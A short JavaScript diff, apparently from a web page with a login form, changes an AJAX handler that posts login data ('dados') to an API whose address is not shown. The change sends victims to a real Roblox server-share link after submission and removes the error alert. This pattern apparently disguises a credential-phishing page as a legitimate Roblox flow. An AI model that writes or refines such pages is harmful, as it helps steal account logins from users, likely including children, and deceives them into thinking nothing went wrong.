@@ -758,10 +758,10 @@
                 data: JSON.stringify(dados),
                 success: function(data) {
                     console.log("Resposta da API:", data);
+                    window.location.href = "https://www.roblox.com/share?code=ac3220567c136e459ae33a7de87794bf&type=Server";
                 },
                 error: function(jqXHR, textStatus, errorThrown) {
                     console.error("Erro na requisição:", textStatus, errorThrown);
-                    alert("Erro ao enviar login.");
                 }
             });
         });
